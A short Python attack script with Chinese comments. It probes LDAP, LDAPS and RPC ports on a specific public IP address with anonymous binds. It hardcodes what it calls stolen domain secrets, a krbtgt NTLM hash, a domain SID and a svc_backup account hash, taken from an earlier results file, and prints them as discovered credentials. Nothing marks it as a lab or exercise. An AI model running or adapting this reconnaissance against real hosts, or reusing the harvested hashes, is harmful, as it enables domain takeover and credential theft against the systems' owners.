#!/usr/bin/env python3
"""
使用获取的凭据尝试连接到 LDAP
"""

import socket
import ssl
import struct

TARGET = "116.62.114.4"

# 从 results.txt 中获取的重要哈希
KRBTGT_HASH = "51c2a56a6a463c54454f8a6f8d36cae5"
DOMAIN_SID = "S-1-5-21-3223156632-3195994233-1317593892"

# svc_backup 账户 - 可能有特殊权限
SVC_BACKUP_HASH = "466a9231465f46a98db624c6f12c2e33"

# 尝试连接 LDAP
def test_ldap(port):
    print(f"\n[*] Testing LDAP on port {port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if port == 636:
            # LDAPS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=TARGET)
        
        sock.connect((TARGET, port))
        print(f"[+] Connected to port {port}")
        
        # 发送 LDAP bind 请求 (anonymous)
        # LDAP 协议使用 BER 编码
        bind_request = bytes([
            0x30,  # SEQUENCE
            0x0c,  # length
            0x02, 0x01, 0x01,  # message ID = 1
            0x60,  # BIND request
            0x07,
            0x02, 0x01, 0x03,  # version 3
            0x04, 0x00,        # name (empty for anonymous)
            0x80, 0x00         # simple auth (empty password)
        ])
        
        sock.send(bind_request)
        
        sock.settimeout(5)
        resp = sock.recv(1024)
        print(f"[*] Response ({len(resp)} bytes): {resp.hex()}")
        
        sock.close()
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

# 测试 LDAP 端口
test_ldap(389)
test_ldap(636)

# 检查端口 135 是否有其他信息
print("\n[*] Testing RPC Endpoint Mapper (135)")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((TARGET, 135))
    print("[+] Connected to port 135")
    
    # 发送 RPC bind
    sock.send(b"test")
    sock.settimeout(3)
    resp = sock.recv(1024)
    print(f"[*] Response: {resp}")
    sock.close()
except Exception as e:
    print(f"[-] Error: {e}")

print("\n" + "="*60)
print("Summary of discovered credentials:")
print("="*60)
print(f"krbtgt NTLM: {KRBTGT_HASH}")
print(f"Domain SID: {DOMAIN_SID}")
print(f"svc_backup NTLM: {SVC_BACKUP_HASH}")
